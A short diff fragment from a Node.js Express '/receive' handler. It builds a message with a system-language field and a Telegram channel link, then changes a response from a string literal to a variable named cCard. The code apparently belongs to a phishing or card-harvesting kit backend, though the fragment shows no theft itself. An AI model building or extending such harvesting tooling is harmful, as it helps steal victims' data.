@@ -96,7 +96,7 @@ app.post('/receive', async (req, res) => {
         `SYSTEM LANGUAGE  : ${systemLang}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-res.send('cCard');
+res.send(cCard);
 
   }
 
